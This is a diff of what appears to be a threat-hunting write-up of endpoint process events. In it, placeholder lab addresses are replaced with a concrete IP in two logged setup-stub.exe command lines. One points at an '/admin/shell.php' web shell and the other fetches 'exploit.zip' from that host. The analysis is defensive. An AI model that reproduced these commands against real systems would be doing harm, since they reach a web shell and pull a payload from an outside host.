@@ -180,14 +180,14 @@ DeviceProcessEvents
 - **Timestamp:** `2025-10-12T05:55:21.0304675Z`
 - **Event:**: `ProcessCreated - setup-stub.exe`
 - **Location:** `C:\Users\employee0\AppData\Local\Temp\7zS847CA906\setup-stub.exe`
-- **Command:** `setup-stub.exe -no-remote -profile "C:\Users\employee®@\Downloads\Temp\MalProfile" http://[YOUR-LAB-IP]/admin/shell.php`
+- **Command:** `setup-stub.exe -no-remote -profile "C:\Users\employee®@\Downloads\Temp\MalProfile" http://172.203.80.23/admin/shell.php`
 - Critical: Direct reference to web shell (shell.php)
 
 - **Timestamp:** `2025-10-12T05:55:21.0304675Z`
 - **Event:**: `ProcessCreated - setup-stub.exe`
 - **Location:** `C:\Users\employee0\AppData\Local\Temp\7zS8F22E6D6\setup-stub.exe`
 - **SHA256:**: `181baa1380e339d8acb6b067c33dd36a5f56e57ee05f7e524b752affaafa75ac`
-- Command: `setup-stub.exe -no-remote -profile "C:\Users\employee®@\Downloads\Temp\MalProfile" http://[YOUR-LAB-IP]/exploit.zip`
+- Command: `setup-stub.exe -no-remote -profile "C:\Users\employee®@\Downloads\Temp\MalProfile" http://172.203.80.23/exploit.zip`
 
 - **Timestamp:** `2025-10-12T05:55:24.8206767Z`
 - **Event:**: `FileDeleted - firefox.exe`
